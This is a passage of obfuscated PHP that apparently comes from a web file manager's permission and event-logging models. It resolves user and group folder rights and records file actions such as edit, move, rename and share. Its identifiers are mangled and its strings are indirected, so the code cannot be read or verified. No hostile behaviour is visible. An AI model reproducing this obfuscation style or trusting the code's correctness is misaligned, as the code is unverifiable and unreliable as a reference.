$÷ÔÇŒÑ€[$»í¸ÜÚÉ] = array_merge($äóïŠÇ¶, $£Å‚¨‚˜); } $÷ùŒğ¸Ÿ = array_values(array_unique($÷ùŒğ¸Ÿ)); $ã¼¡ÅûÆ = array($äÊ— —³[2015] => $÷ùŒğ¸Ÿ, $äÊ— —³[2016] => $÷ÔÇŒÑ€); $ŸéªÇ«—[$ñÄî¼¥Ç] = $ã¼¡ÅûÆ; return $ã¼¡ÅûÆ; } private function makeSourceAuth($¾‰ã”“, $¥Ä…Êãü, $Üçù¹åÈ = false) { $Æº²ø©Ñ =& $_SERVER[„Ç©ñÎ©]; $“ÃÕ€ ¤ = $Æº²ø©Ñ[98]; $•Î‚½Çè = $¾‰ã”“[$Æº²ø©Ñ[514]]; $Š‡¹éˆØ = $¾‰ã”“[$Æº²ø©Ñ[420]] == SourceModel::TYPE_GROUP; $…Ğø¬ıè = $Š‡¹éˆØ ? $this->groupRootAuth($•Î‚½Çè, $Üçù¹åÈ) : !1; if ($…Ğø¬ıè && Model($Æº²ø©Ñ[516])->authCheckAction($…Ğø¬ıè[$Æº²ø©Ñ[422]], $Æº²ø©Ñ[1848])) { return $this->groupAuthInfo($…Ğø¬ıè, $•Î‚½Çè); } $Ù·óÏüê = Model($Æº²ø©Ñ[1326])->parentLevelArray($¾‰ã”“[$Æº²ø©Ñ[530]]); $Ù·óÏüê = array_merge(array($¾‰ã”“[$Æº²ø©Ñ[411]]), array_reverse($Ù·óÏüê)); $¼¤¡ØòÌ = !1; foreach ($Ù·óÏüê as $“çúú¶Š) { if (!isset($¥Ä…Êãü[$“çúú¶Š])) { continue; } $ìåò½ = $this->authMake($¥Ä…Êãü[$“çúú¶Š], $Üçù¹åÈ); if ($ìåò½[$Æº²ø©Ñ[476]]) { $¼¤¡ØòÌ = $ìåò½; break; } } if (!$Š‡¹éˆØ) { return $¼¤¡ØòÌ; } if (!$¼¤¡ØòÌ && $…Ğø¬ıè) { $¼¤¡ØòÌ = $this->groupAuthInfo($…Ğø¬ıè, $•Î‚½Çè); } if (!$¼¤¡ØòÌ) { $ªûıç = Model($Æº²ø©Ñ[531])->getInfo($•Î‚½Çè); $•Š–¤ØĞ = explode($Æº²ø©Ñ[50], trim($ªûıç[$Æº²ø©Ñ[530]], $Æº²ø©Ñ[50])); $•Š–¤ØĞ = array_reverse($•Š–¤ØĞ); foreach ($•Š–¤ØĞ as $Î´Úë®˜) { if ($Î´Úë®˜ == $Æº²ø©Ñ[207] || $Î´Úë®˜ == $“ÃÕ€ ¤) { continue; } $ˆÉ·üÖá = $this->groupRootAuth($Î´Úë®˜, $Üçù¹åÈ); if (!$ˆÉ·üÖá) { continue; } $¼¤¡ØòÌ = $this->groupAuthInfo($ˆÉ·üÖá, $Î´Úë®˜); break; } } if (!$¼¤¡ØòÌ || $¼¤¡ØòÌ[$Æº²ø©Ñ[423]] <= 0) { $Ì–†ºÙÁ = $this->authDeepCheck($¾‰ã”“[$Æº²ø©Ñ[411]], $Üçù¹åÈ); if ($Ì–†ºÙÁ) { $¼¤¡ØòÌ = $Ì–†ºÙÁ; } } return $¼¤¡ØòÌ; } private function userIsRoot($şÓıòİ = false) { $Ş¥à¨Òë =& $_SERVER[„Ç©ñÎ©]; if (!$şÓıòİ && _get($GLOBALS, $Ş¥à¨Òë[512])) { return !0; } $”Ó—ãµ = Model($Ş¥à¨Òë[544])->getInfo($şÓıòİ); $áÕÃ¡é = Model($Ş¥à¨Òë[2024])->listData($”Ó—ãµ[$Ş¥à¨Òë[1534]]); if ($áÕÃ¡é && $áÕÃ¡é[$Ş¥à¨Òë[520]][$Ş¥à¨Òë[2025]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ƒ®°´¢Å) { $äõ™çĞ“ =& $_SERVER[„Ç©ñÎ©]; $Ü€•ê‹ì = Model($äõ™çĞ“[1326]); $ùÕÎÂãÃ = $Ü€•ê‹ì->sourceInfo($ƒ®°´¢Å); if (!$ùÕÎÂãÃ) { return !1; } $Ü€•ê‹ì->groupPathDisplay($ùÕÎÂãÃ); $Êé“äßš = array($ùÕÎÂãÃ); $Êé“äßš = $Ü€•ê‹ì->_listAppendPath($Êé“äßš); $ùÕÎÂãÃ = $Êé“äßš[0]; $÷­ŒâÊ = $ùÕÎÂãÃ[$äõ™çĞ“[528]]; if (isset($ùÕÎÂãÃ[$äõ™çĞ“[536]])) { $¨ëŞ†«„ = explode($äõ™çĞ“[8], trim($ùÕÎÂãÃ[$äõ™çĞ“[528]], $äõ™çĞ“[8])); array_shift($¨ëŞ†«„); $÷­ŒâÊ = $ùÕÎÂãÃ[$äõ™çĞ“[534]] . $äõ™çĞ“[2026] . implode($äõ™çĞ“[8], $¨ëŞ†«„); } return array($äõ™çĞ“[429] => $ùÕÎÂãÃ[$äõ™çĞ“[32]], $äõ™çĞ“[94] => KodIO::make($ùÕÎÂãÃ[$äõ™çĞ“[411]]), $äõ™çĞ“[2027] => $÷­ŒâÊ); } private function groupAuthInfo($§ÉÏÔ, $›Æ¢µö) { $…‚à =& $_SERVER[„Ç©ñÎ©]; $¶®‚ä = Model($…‚à[531])->getInfo($›Æ¢µö); return array($…‚à[2028] => intval($§ÉÏÔ[$…‚à[422]]), $…‚à[2012] => $§ÉÏÔ, $…‚à[2029] => LNG($…‚à[2030]), $…‚à[2021] => array($…‚à[429] => $¶®‚ä[$…‚à[32]], $…‚à[94] => KodIO::make($¶®‚ä[$…‚à[96]][$…‚à[411]]), $…‚à[2027] => $¶®‚ä[$…‚à[535]])); } protected function groupRootAuth($Ç—Ç×û , $¤ø§“Çá = false) { $ä¶Ğ•‘„ =& $_SERVER[„Ç©ñÎ©]; $¤ø§“Çá = $¤ø§“Çá ? $¤ø§“Çá : USER_ID; $ó’¼“§ = $¤ø§“Çá . $ä¶Ğ•‘„[2031] . $Ç—Ç×û ; static $ú„§ŸÇ = array(); if (isset($ú„§ŸÇ[$ó’¼“§])) { return $ú„§ŸÇ[$ó’¼“§]; } $¹ÁÜ¯„‰ = Model($ä¶Ğ•‘„[531])->getInfo($Ç—Ç×û ); $èáÉ»ƒª = $this->userGroupList($¤ø§“Çá); $º°ªù¦ = isset($èáÉ»ƒª[$Ç—Ç×û ]) ? $èáÉ»ƒª[$Ç—Ç×û ][$ä¶Ğ•‘„[422]] : !1; if ($º°ªù¦ && Model($ä¶Ğ•‘„[516])->authCheckAction($º°ªù¦[$ä¶Ğ•‘„[422]], $ä¶Ğ•‘„[1848])) { $ú„§ŸÇ[$ó’¼“§] = $º°ªù¦; return $º°ªù¦; } $ç´©¥¡‹ = $this->sourceAuthSelect($¹ÁÜ¯„‰[$ä¶Ğ•‘„[96]][$ä¶Ğ•‘„[411]]); $¦…İş‚ = $ç´©¥¡‹ ? $this->authMake($ç´©¥¡‹, $¤ø§“Çá) : !1; $ÙúïÁ¡ = $¦…İş‚ ? $¦…İş‚[$ä¶Ğ•‘„[476]] : !1; $ú„§ŸÇ[$ó’¼“§] = $ÙúïÁ¡ ? $ÙúïÁ¡ : $º°ªù¦; return $ú„§ŸÇ[$ó’¼“§]; } public function authOwnerApply($ì¯Õ¨Õê) { $³„¿Ÿ¶´ =& $_SERVER[„Ç©ñÎ©]; if (empty($ì¯Õ¨Õê[$³„¿Ÿ¶´[422]]) || isset($ì¯Õ¨Õê[$³„¿Ÿ¶´[2032]]) && $ì¯Õ¨Õê[$³„¿Ÿ¶´[2032]]) { return $ì¯Õ¨Õê; } if (AuthModel::authCheckRoot($ì¯Õ¨Õê[$³„¿Ÿ¶´[422]][$³„¿Ÿ¶´[423]])) { return $ì¯Õ¨Õê; } $ªÊ¶èì = Model($³„¿Ÿ¶´[1326])->parentLevelArray($ì¯Õ¨Õê[$³„¿Ÿ¶´[530]]); $ªÊ¶èì = array_merge(array($ì¯Õ¨Õê[$³„¿Ÿ¶´[411]]), array_reverse($ªÊ¶èì)); $à˜ƒ±¿‹ = $this->sourceAuthSelect($ªÊ¶èì); $µ¦É˜¹† = array(); $’„”ÆÜ¸ = array(); foreach ($à˜ƒ±¿‹ as $ìšû“Íµ => $’Í©ÃÍ) { $ÁÀ“Ï‹ = $this->authFolderOwnerUser($’Í©ÃÍ); $µ¦É˜¹†[$ìšû“Íµ] = $ÁÀ“Ï‹; $’„”ÆÜ¸ = array_merge($’„”ÆÜ¸, $ÁÀ“Ï‹[$³„¿Ÿ¶´[609]]); if ($ÁÀ“Ï‹[$³„¿Ÿ¶´[2033]]) { break; } } if (count($’„”ÆÜ¸) == 0) { $’„”ÆÜ¸ = $this->authFolderOwnerGroup($ì¯Õ¨Õê[$³„¿Ÿ¶´[514]]); } $’„”ÆÜ¸ = array_unique($’„”ÆÜ¸); if (AuthModel::authCheckRoot($ì¯Õ¨Õê[$³„¿Ÿ¶´[422]][$³„¿Ÿ¶´[423]])) { $’„”ÆÜ¸[] = USER_ID; } $ì¯Õ¨Õê[$³„¿Ÿ¶´[422]][$³„¿Ÿ¶´[2034]] = Model($³„¿Ÿ¶´[522])->userListInfo($’„”ÆÜ¸); return $ì¯Õ¨Õê; } private function authFolderOwnerGroup($©Çò°ƒ¤) { $ô†üÆ¦† =& $_SERVER[„Ç©ñÎ©]; $íñ‰îé = Model($ô†üÆ¦†[1917])->where(array($ô†üÆ¦†[1827] => $©Çò°ƒ¤))->select(); $ûÅıû¨ = array(); if (!$íñ‰îé) { return $ûÅıû¨; } foreach ($íñ‰îé as $æ°ÕÑÀà) { $ÇÍÑäŸü = $this->authInfo($æ°ÕÑÀà); if (AuthModel::authCheckRoot($ÇÍÑäŸü[$ô†üÆ¦†[422]])) { $ûÅıû¨[] = $æ°ÕÑÀà[$ô†üÆ¦†[1655]]; } } return $ûÅıû¨; } private function authFolderOwnerUser($éù—œşà) { $ïŒ†¸…Ğ =& $_SERVER[„Ç©ñÎ©]; $ó°Ì–Û = array(); $«´ç«ñ† = !1; foreach ($éù—œşà as $½¹Á–Å¹) { $°Ï‰úÅ = $this->authInfo($½¹Á–Å¹); if ($½¹Á–Å¹[$ïŒ†¸…Ğ[514]] == $ïŒ†¸…Ğ[207]) { $«´ç«ñ† = !0; } if ($½¹Á–Å¹[$ïŒ†¸…Ğ[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($°Ï‰úÅ[$ïŒ†¸…Ğ[422]])) { $ó°Ì–Û[] = $½¹Á–Å¹[$ïŒ†¸…Ğ[514]]; } } } return array($ïŒ†¸…Ğ[609] => $ó°Ì–Û, $ïŒ†¸…Ğ[2033] => $«´ç«ñ†); } public function authMake($¥ìˆ†Ö—, $™ßçè† = false) { $›Ê…è’ü =& $_SERVER[„Ç©ñÎ©]; $Øª×Æ® = $this->authArrayCheck($¥ìˆ†Ö—, $™ßçè†); if ($Øª×Æ®[$›Ê…è’ü[2035]]) { $Øª×Æ®[$›Ê…è’ü[2035]] = $this->sourceAuthInfo($Øª×Æ®[$›Ê…è’ü[2035]]); } return $Øª×Æ®; } public function authArrayCheck($¿Ã¨¡Ñ‘, $µ ™çÆè = false) { $ˆ‚¾§ÁÅ =& $_SERVER[„Ç©ñÎ©]; if (!$¿Ã¨¡Ñ‘) { return array($ˆ‚¾§ÁÅ[423] => 0, $ˆ‚¾§ÁÅ[476] => !1); } $µ ™çÆè = $µ ™çÆè ? $µ ™çÆè : USER_ID; $¬äôÂÁ¶ = 0; $Ã‘¼å€Ç = 0; $“úü½•Â = 0; $åÎÌÃ¶… = 0; $‘”¥Ì§” = 0; $Ğ¾‘óúå = 0; $şà’Ï²’ = 1000; $ŠıòÁğ = 0; $èüªûÍ = 0; $òêÒÌÀ« = 0; $µ»ú­™ = 0; $ù”€¥Ï = array($ˆ‚¾§ÁÅ[411] => 0); foreach ($¿Ã¨¡Ñ‘ as $ù”€¥Ï) { $œìÂ€„ = $this->authInfo($ù”€¥Ï); if (!$œìÂ€„) { continue; } $Ùü©ı¬ = $ù”€¥Ï[$ˆ‚¾§ÁÅ[514]]; $¦ƒËıÌ = intval($œìÂ€„[$ˆ‚¾§ÁÅ[422]]); if ($ù”€¥Ï[$ˆ‚¾§ÁÅ[420]] == SourceModel::TYPE_USER && $Ùü©ı¬ == $µ ™çÆè) { $¬äôÂÁ¶ = !0; $“úü½•Â = $œìÂ€„; $Ã‘¼å€Ç = $¦ƒËıÌ; } else { if ($ù”€¥Ï[$ˆ‚¾§ÁÅ[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ùü©ı¬, $µ ™çÆè)) { $åÎÌÃ¶… = !0; $à®Ã½…ª = $this->groupStepToUserGroup($Ùü©ı¬, $µ ™çÆè); if ($à®Ã½…ª < $şà’Ï²’) { $şà’Ï²’ = $à®Ã½…ª; $‘”¥Ì§” = $¦ƒËıÌ; $Ğ¾‘óúå = $œìÂ€„; $ŠıòÁğ = $Ùü©ı¬; } if ($à®Ã½…ª == $şà’Ï²’ && $¦ƒËıÌ >= $‘”¥Ì§”) { $‘”¥Ì§” = $¦ƒËıÌ; $Ğ¾‘óúå = $œìÂ€„; $ŠıòÁğ = $Ùü©ı¬; } } else { if ($Ùü©ı¬ == $ˆ‚¾§ÁÅ[207]) { $èüªûÍ = !0; $µ»ú­™ = $œìÂ€„; $òêÒÌÀ« = $¦ƒËıÌ; } } } } if ($¬äôÂÁ¶) { $¸É›¬€İ = $Ã‘¼å€Ç; $œìÂ€„ = $“úü½•Â; $ì Öè– = LNG($ˆ‚¾§ÁÅ[2036]); } else { if ($åÎÌÃ¶…) { $¸É›¬€İ = $‘”¥Ì§”; $œìÂ€„ = $Ğ¾‘óúå; $ã²Ÿ¥Æ = Model($ˆ‚¾§ÁÅ[531])->getInfo($ŠıòÁğ); $ì Öè– = $ˆ‚¾§ÁÅ[172] . $ã²Ÿ¥Æ[$ˆ‚¾§ÁÅ[535]] . $ˆ‚¾§ÁÅ[2037] . LNG($ˆ‚¾§ÁÅ[2038]); } else { if ($èüªûÍ) { $¸É›¬€İ = $òêÒÌÀ«; $œìÂ€„ = $µ»ú­™; $ì Öè– = LNG($ˆ‚¾§ÁÅ[2009]); } else { $¸É›¬€İ = 0; $œìÂ€„ = !1; $ì Öè– = $ˆ‚¾§ÁÅ[12]; } } } $§ÓŞëÍé = array($ˆ‚¾§ÁÅ[2028] => intval($¸É›¬€İ), $ˆ‚¾§ÁÅ[2012] => $œìÂ€„, $ˆ‚¾§ÁÅ[2029] => $ì Öè–, $ˆ‚¾§ÁÅ[2021] => $ù”€¥Ï[$ˆ‚¾§ÁÅ[411]]); return $§ÓŞëÍé; } private function groupContainUser($‡…›×ù‹, $½¶ûïÌÑ = false) { return in_array($‡…›×ù‹, $this->userGroupParents($½¶ûïÌÑ)); } private function groupStepToUserGroup($ä­™¾‡„, $ŸÌöóó = false) { $»ÁÍçÆÈ =& $_SERVER[„Ç©ñÎ©]; $õ‘¤°õ« = $this->userGroupList($ŸÌöóó); $Ìîí°öŠ = 1000; $„ËÀÕ°Á = $GLOBALS[$»ÁÍçÆÈ[6]][$»ÁÍçÆÈ[99]][$»ÁÍçÆÈ[1930]] == 1; $ì×°ù•È = $„ËÀÕ°Á ? 3 : 2; foreach ($õ‘¤°õ« as $­­¹‘¾ª) { if ($­­¹‘¾ª[$»ÁÍçÆÈ[1827]] == $ä­™¾‡„) { return 0; } $ÄÎÆ«‚Š = explode($»ÁÍçÆÈ[50], trim($­­¹‘¾ª[$»ÁÍçÆÈ[530]], $»ÁÍçÆÈ[50])); if ($ÄÎÆ«‚Š[0] == $»ÁÍçÆÈ[207] && count($ÄÎÆ«‚Š) > $ì×°ù•È) { $¯ŞÙ»ì’ = array_reverse(array_slice($ÄÎÆ«‚Š, $ì×°ù•È)); $ìßå²â = array_search($ä­™¾‡„, $¯ŞÙ»ì’); if ($ìßå²â !== !1 && $ìßå²â + 1 <= $Ìîí°öŠ) { $Ìîí°öŠ = $ìßå²â + 1; } } } return $Ìîí°öŠ; } private function userGroupList($³÷àÔŠ = false) { $Å±ˆÙˆ =& $_SERVER[„Ç©ñÎ©]; static $¶•€×¼¼ = array(); if (isset($¶•€×¼¼[$³÷àÔŠ])) { return $¶•€×¼¼[$³÷àÔŠ]; } $À‡Ø§Ñó = Model($Å±ˆÙˆ[544])->getInfo($³÷àÔŠ); $¶•€×¼¼[$³÷àÔŠ] = array_to_keyvalue($À‡Ø§Ñó[$Å±ˆÙˆ[2010]], $Å±ˆÙˆ[1827]); return $¶•€×¼¼[$³÷àÔŠ]; } public function userGroupParents($„½‰·ïğ) { $®ö¥ë =& $_SERVER[„Ç©ñÎ©]; static $Ã¶¸ÓÜ = array(); $„½‰·ïğ = $„½‰·ïğ ? $„½‰·ïğ : USER_ID; if (isset($Ã¶¸ÓÜ[$„½‰·ïğ])) { return $Ã¶¸ÓÜ[$„½‰·ïğ]; } $“ÅİÂ¡  = $this->userGroupList($„½‰·ïğ); $ÄØË¥³Ô = array(); $¨æááËé = $GLOBALS[$®ö¥ë[6]][$®ö¥ë[99]][$®ö¥ë[1930]] == 1; $¨èø¦Åô = $¨æááËé ? 3 : 2; foreach ($“ÅİÂ¡  as $„¬½Äæ) { $¨Øƒê²ë = array($„¬½Äæ[$®ö¥ë[1827]]); $øò¯“¶ = explode($®ö¥ë[50], trim($„¬½Äæ[$®ö¥ë[530]], $®ö¥ë[50])); if ($øò¯“¶[0] == $®ö¥ë[207] && count($øò¯“¶) > $¨èø¦Åô) { $ÈÒ¬ë = array_slice($øò¯“¶, $¨èø¦Åô); $¨Øƒê²ë = array_merge($¨Øƒê²ë, array_reverse($ÈÒ¬ë)); } $ÄØË¥³Ô = array_merge($ÄØË¥³Ô, $¨Øƒê²ë); } $Ã¶¸ÓÜ[$„½‰·ïğ] = array_unique($ÄØË¥³Ô); return $Ã¶¸ÓÜ[$„½‰·ïğ]; } public function authTargetInfoMake($ç—û©şÜ) { $şìÎ·Ô =& $_SERVER[„Ç©ñÎ©]; $¶è‚¤ĞÕ = array(); $‚ÚÔÔÊ€ = array(); foreach ($ç—û©şÜ as $Ùö…„ÈŠ) { if ($Ùö…„ÈŠ[$şìÎ·Ô[420]] == SourceModel::TYPE_USER) { $¶è‚¤ĞÕ[] = intval($Ùö…„ÈŠ[$şìÎ·Ô[514]]); } else { if ($Ùö…„ÈŠ[$şìÎ·Ô[420]] == SourceModel::TYPE_GROUP) { $‚ÚÔÔÊ€[] = intval($Ùö…„ÈŠ[$şìÎ·Ô[514]]); } } } if ($¶è‚¤ĞÕ) { $¶è‚¤ĞÕ = Model($şìÎ·Ô[522])->userListInfo($¶è‚¤ĞÕ); } if ($‚ÚÔÔÊ€) { $€æÏçµø = array($şìÎ·Ô[1915] => array($şìÎ·Ô[427], $‚ÚÔÔÊ€)); $‚ÚÔÔÊ€ = Model($şìÎ·Ô[531])->field($şìÎ·Ô[2039])->where($€æÏçµø)->select(); $‚ÚÔÔÊ€ = array_to_keyvalue($‚ÚÔÔÊ€, $şìÎ·Ô[1827]); } return array($şìÎ·Ô[2040] => $¶è‚¤ĞÕ, $şìÎ·Ô[2041] => $‚ÚÔÔÊ€); } public function authInfo($›úûï») { $±åÖ§Ğ =& $_SERVER[„Ç©ñÎ©]; if ($›úûï»[$±åÖ§Ğ[1931]]) { $úÜÆåßõ = Model($±åÖ§Ğ[516])->listData($›úûï»[$±åÖ§Ğ[1931]]); if (!$úÜÆåßõ) { return !1; $…Ó”ÊÕã = Model($±åÖ§Ğ[516])->listData(); $ó¨ô‡Òß = array_filter_by_field($…Ó”ÊÕã, $±åÖ§Ğ[422], $±åÖ§Ğ[207]); return $ó¨ô‡Òß; } $µ§ËÏÔ´ = array_field_key($úÜÆåßõ, array($±åÖ§Ğ[408], $±åÖ§Ğ[32], $±åÖ§Ğ[422], $±åÖ§Ğ[1850], $±åÖ§Ğ[1851])); $µ§ËÏÔ´[$±åÖ§Ğ[2042]] = $›úûï»; return $µ§ËÏÔ´; } else { return array($±åÖ§Ğ[428] => 0, $±åÖ§Ğ[1833] => $›úûï»[$±åÖ§Ğ[1987]], $±åÖ§Ğ[429] => $±åÖ§Ğ[12], $±åÖ§Ğ[1850] => $±åÖ§Ğ[2043]); } } } goto FŞË·Æ†‡; FŞË·Æ†‡: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\x63\x65\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\151\x6d\145", "\x74\x69\x6d\145", "\151\156\163\145\x72\164", "\x66\x75\x6e\143\x74\151\x6f\x6e"), array("\144\x65\163\x63", '', "\151\156\x73\145\162\x74\54\165\x70\x64\x61\x74\x65\54\163\x65\x6c\x65\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÏÉ©ôÕœ, $Û¿µ³, $µˆš†ïÈ = '') { $Ãó”íüŸ =& $_SERVER[„Ç©ñÎ©]; if (!$this->eventSave) { return; } $ÏºÜ“›Â = Model($Ãó”íüŸ[1326])->sourceInfo($ÏÉ©ôÕœ); if (!$ÏºÜ“›Â) { return !1; } if ($this->isCacheEvent($ÏºÜ“›Â, $Û¿µ³)) { return; } if ($µˆš†ïÈ && is_string($µˆš†ïÈ)) { $µˆš†ïÈ = array($Ãó”íüŸ[1866] => $µˆš†ïÈ); } $”ÙôÅ¼ó = array($Ãó”íüŸ[426] => $ÏÉ©ôÕœ, $Ãó”íüŸ[2044] => $ÏºÜ“›Â[$Ãó”íüŸ[441]], $Ãó”íüŸ[2045] => $ÏºÜ“›Â[$Ãó”íüŸ[32]], $Ãó”íüŸ[528] => !empty($ÏºÜ“›Â[$Ãó”íüŸ[528]]) ? $ÏºÜ“›Â[$Ãó”íüŸ[528]] : $Ãó”íüŸ[12], $Ãó”íüŸ[1646] => USER_ID, $Ãó”íüŸ[431] => $Û¿µ³, $Ãó”íüŸ[1648] => $µˆš†ïÈ); $this->addSystemLog($Û¿µ³, $”ÙôÅ¼ó); unset($”ÙôÅ¼ó[$Ãó”íüŸ[2045]], $”ÙôÅ¼ó[$Ãó”íüŸ[528]]); return $this->add($”ÙôÅ¼ó); } private function addSystemLog($íçÉí‘, $š›¸ìÑ‰) { $ËöÆ¦¤ù =& $_SERVER[„Ç©ñÎ©]; if ($íçÉí‘ == $ËöÆ¦¤ù[2046]) { $íçÉí‘ = $š›¸ìÑ‰[$ËöÆ¦¤ù[462]][$ËöÆ¦¤ù[2047]]; } else { if (in_array($íçÉí‘, array($ËöÆ¦¤ù[1807], $ËöÆ¦¤ù[2048]))) { $íçÉí‘ = $š›¸ìÑ‰[$ËöÆ¦¤ù[462]][$ËöÆ¦¤ù[758]]; } } $¶ğóë = array_merge($š›¸ìÑ‰, array($ËöÆ¦¤ù[2049] => $š›¸ìÑ‰[$ËöÆ¦¤ù[411]], $ËöÆ¦¤ù[2050] => $š›¸ìÑ‰[$ËöÆ¦¤ù[2050]])); Hook::trigger($ËöÆ¦¤ù[2051], $ËöÆ¦¤ù[2052] . $íçÉí‘, $š›¸ìÑ‰); Model($ËöÆ¦¤ù[1771])->addLog($ËöÆ¦¤ù[2052] . $íçÉí‘, $¶ğóë); } private function isCacheEvent($…şĞàÖ‘, $™¯˜¡×õ) { if ($…şĞàÖ‘[$_SERVER[„Ç©ñÎ©][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ôµ‘”‚, $à‘¿´ê­) { $—ª‚ÄÌñ =& $_SERVER[„Ç©ñÎ©]; $” °¯‘· = Model($—ª‚ÄÌñ[1326])->sourceInfo($ôµ‘”‚); $ª¸Ï¢Áš = array($—ª‚ÄÌñ[2047] => $à‘¿´ê­, $—ª‚ÄÌñ[32] => $” °¯‘·[$—ª‚ÄÌñ[32]]); return $this->addEvent($ôµ‘”‚, $—ª‚ÄÌñ[2046], $ª¸Ï¢Áš); } public function eventFileEdit($¾“Äú¸) { $Òã´“ğ§ =& $_SERVER[„Ç©ñÎ©]; $ ôÂöğ¡ = array($Òã´“ğ§[2053] => $_SERVER[$Òã´“ğ§[2054]], $Òã´“ğ§[2055] => strtolower(ACTION)); if (isset($GLOBALS[$Òã´“ğ§[7]][$Òã´“ğ§[2056]])) { $ ôÂöğ¡[$Òã´“ğ§[2056]] = $Òã´“ğ§[98]; } return $this->addEvent($¾“Äú¸, $Òã´“ğ§[1797], $ ôÂöğ¡); } public function eventRecycle($Í˜¸Øë€, $œîíçÚ) { return $this->addEvent($Í˜¸Øë€, $_SERVER[„Ç©ñÎ©][2048], $œîíçÚ); } public function eventRemove($ş¤Šş±Ş) { $ë÷µÁİ =& $_SERVER[„Ç©ñÎ©]; $è–úõ÷À = Model($ë÷µÁİ[1326])->sourceInfo($ş¤Šş±Ş); $èº± üç = $è–úõ÷À[$ë÷µÁİ[32]]; return $this->addEvent($è–úõ÷À[$ë÷µÁİ[441]], $ë÷µÁİ[1796], $èº± üç); } public function eventShare($•ú°şâ™, $æ¨ßóä) { return $this->addEvent($•ú°şâ™, $_SERVER[„Ç©ñÎ©][1807], $æ¨ßóä); } public function eventMove($âúÓŞÊé, $ÍÔÍÂ½Í, $ùµ½ü–) { $áÃøğÖÇ =& $_SERVER[„Ç©ñÎ©]; $©¦ô³çâ = Model($áÃøğÖÇ[1326]); $Ãø«·êĞ = $©¦ô³çâ->sourceInfo($âúÓŞÊé); $‹çšôŠâ = $©¦ô³çâ->sourceInfo($ÍÔÍÂ½Í); $Ïó³€İ´ = $©¦ô³çâ->sourceInfo($ùµ½ü–); $‚ûÙÇ½ê = array($áÃøğÖÇ[1159] => $ÍÔÍÂ½Í, $áÃøğÖÇ[2057] => $‹çšôŠâ[$áÃøğÖÇ[32]], $áÃøğÖÇ[2035] => !empty($‹çšôŠâ[$áÃøğÖÇ[528]]) ? $‹çšôŠâ[$áÃøğÖÇ[528]] : $áÃøğÖÇ[12], $áÃøğÖÇ[1160] => $ùµ½ü–, $áÃøğÖÇ[2058] => $Ïó³€İ´[$áÃøğÖÇ[32]], $áÃøğÖÇ[2059] => !empty($Ïó³€İ´[$áÃøğÖÇ[528]]) ? $Ïó³€İ´[$áÃøğÖÇ[528]] : $áÃøğÖÇ[12]); $this->addEvent($âúÓŞÊé, $áÃøğÖÇ[566], $‚ûÙÇ½ê); $Ãø«·êĞ = $©¦ô³çâ->sourceInfo($âúÓŞÊé); $‚ûÙÇ½ê = array($áÃøğÖÇ[411] => $Ãø«·êĞ[$áÃøğÖÇ[411]], $áÃøğÖÇ[32] => $Ãø«·êĞ[$áÃøğÖÇ[32]]); $this->addEvent($ÍÔÍÂ½Í, $áÃøğÖÇ[2060], $‚ûÙÇ½ê); } public function eventCopy($¿ÊùÊÌ) { $this->eventCreate($¿ÊùÊÌ, $_SERVER[„Ç©ñÎ©][564]); } public function eventRename($îÒ«ê¾Û, $È‘ü¶Ü¤, $‰„™ÂÏƒ) { $—÷áŠ¿ =& $_SERVER[„Ç©ñÎ©]; $´¬ê´³Â = array($—÷áŠ¿[1159] => $È‘ü¶Ü¤, $—÷áŠ¿[1160] => $‰„™ÂÏƒ); return $this->addEvent($îÒ«ê¾Û, $—÷áŠ¿[1341], $´¬ê´³Â); } public function eventAddComment($‚Ç¼ôâî, $÷öˆã®Ô) { return $this->addEvent($‚Ç¼ôâî, $_SERVER[„Ç©ñÎ©][2061], $÷öˆã®Ô); } public function eventAddDesc($ÊüÙ‡ë, $“øÊåğ«) { return $this->addEvent($ÊüÙ‡ë, $_SERVER[„Ç©ñÎ©][2062], $“øÊåğ«); } public function listBySource($¸€»¹ß) { $®ßÂ£¾« =& $_SERVER[„Ç©ñÎ©]; $ş€Ùş = Model($®ßÂ£¾«[1326])->sourceInfo($¸€»¹ß); $à™Íøë = array($®ßÂ£¾«[426] => $¸€»¹ß); if ($ş€Ùş[$®ßÂ£¾«[419]] == $®ßÂ£¾«[98]) { $†¯éËê = Model($®ßÂ£¾«[1326])->listSearchChildren($¸€»¹ß, 20000); $†¯éËê[] = $¸€»¹ß . $®ßÂ£¾«[387]; $à™Íøë = array($®ßÂ£¾«[411] => array($®ßÂ£¾«[7], $†¯éËê)); } $“²Ïóâ€ = $this->where($à™Íøë)->order($®ßÂ£¾«[2063])->selectPage(); if ($“²Ïóâ€[$®ßÂ£¾«[375]][$®ßÂ£¾«[376]] == 0) { $“²Ïóâ€[$®ßÂ£¾«[375]][$®ßÂ£¾«[376]] = 1; $“²Ïóâ€[$®ßÂ£¾«[378]] = array(array($®ßÂ£¾«[426] => $¸€»¹ß, $®ßÂ£¾«[2044] => $ş€Ùş[$®ßÂ£¾«[441]], $®ßÂ£¾«[1646] => $ş€Ùş[$®ßÂ£¾«[463]], $®ßÂ£¾«[431] => $®ßÂ£¾«[2064], $®ßÂ£¾«[432] => $ş€Ùş[$®ßÂ£¾«[210]], $®ßÂ£¾«[1648] => $®ßÂ£¾«[12])); } return $this->eventListParse($“²Ïóâ€, $¸€»¹ß); } private function eventListParse($Üêü±›´, $Ğ¸ªŒé) { $¨£¯«Ô€ =& $_SERVER[„Ç©ñÎ©]; $¦ú»Ã¾à = $Üêü±›´[$¨£¯«Ô€[378]]; $±îÜ¥‹™ = array_to_keyvalue($¦ú»Ã¾à, $¨£¯«Ô€[12], $¨£¯«Ô€[411]); $©¡Ÿîâ = array_to_keyvalue($¦ú»Ã¾à, $¨£¯«Ô€[12], $¨£¯«Ô€[2050]); foreach ($¦ú»Ã¾à as $¨ÅÕä¤¾) { $©†÷Ó¤Ã = $¨ÅÕä¤¾[$¨£¯«Ô€[462]]; if ($¨ÅÕä¤¾[$¨£¯«Ô€[33]] == $¨£¯«Ô€[566] && isset($©†÷Ó¤Ã[$¨£¯«Ô€[1159]])) { $±îÜ¥‹™[] = 